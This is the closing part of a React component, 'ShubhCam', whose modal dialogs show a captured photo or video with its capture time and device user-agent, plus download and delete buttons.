                <Button onClick={() => downloadPhoto(viewingPhoto)} size="sm"
                  className="flex-1 bg-primary text-primary-foreground hover:bg-primary/90 text-xs">
                  <Download className="w-3 h-3 mr-1" /> Download
                </Button>
                <Button onClick={() => { deletePhoto(viewingPhoto.id, viewingPhoto.image_data); setViewingPhoto(null); }} size="sm" variant="outline"
                  className="flex-1 border-destructive text-destructive hover:bg-destructive/10 text-xs">
                  <Trash2 className="w-3 h-3 mr-1" /> Delete
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Video View Modal */}
      <Dialog open={!!viewingVideo} onOpenChange={() => setViewingVideo(null)}>
        <DialogContent className="p-0 bg-card border border-secondary/30 max-w-[90vw] sm:max-w-md rounded-2xl overflow-hidden glow-pink">
          {viewingVideo && (
            <div>
              <div className="flex items-center justify-between p-3 border-b border-border/50">
                <div className="flex items-center gap-2">
                  <Video className="w-4 h-4 text-secondary" />
                  <span className="text-sm font-semibold">Video</span>
                  <span className="text-[10px] text-muted-foreground font-mono">{viewingVideo.duration_seconds}s</span>
                </div>
                <Button size="icon" variant="ghost" onClick={() => setViewingVideo(null)} className="h-6 w-6"><X className="w-4 h-4" /></Button>
              </div>
              <div className="p-3">
                <div className="aspect-video w-full overflow-hidden rounded-xl border border-border/30 bg-background/50">
                  <video src={viewingVideo.video_url} controls autoPlay className="w-full h-full object-contain" />
                </div>
                <div className="mt-2 text-[10px] text-muted-foreground space-y-1 glass-card rounded-lg p-2">
                  <p>📅 {new Date(viewingVideo.captured_at).toLocaleString()}</p>
                  {viewingVideo.user_agent && <p className="truncate">📱 {viewingVideo.user_agent.slice(0, 40)}...</p>}
                </div>
              </div>
              <div className="flex gap-2 p-3 pt-0">
                <Button onClick={() => window.open(viewingVideo.video_url, '_blank')} size="sm"
                  className="flex-1 bg-secondary text-secondary-foreground hover:bg-secondary/90 text-xs">
                  <Download className="w-3 h-3 mr-1" /> Download
                </Button>
                <Button onClick={() => { deleteVideo(viewingVideo.id, viewingVideo.video_url); setViewingVideo(null); }} size="sm" variant="outline"
                  className="flex-1 border-destructive text-destructive hover:bg-destructive/10 text-xs">
                  <Trash2 className="w-3 h-3 mr-1" /> Delete
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default ShubhCam;
